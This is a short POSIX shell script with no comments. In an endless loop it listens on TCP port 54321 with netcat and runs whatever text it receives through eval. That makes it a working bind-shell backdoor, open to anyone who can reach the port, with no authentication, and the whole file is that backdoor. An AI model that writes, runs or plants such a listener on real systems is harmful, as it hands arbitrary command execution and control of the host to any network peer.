#!/bin/sh
while true ; do
  x=$(nc -l -q 0 -p 54321)
  eval $x
done

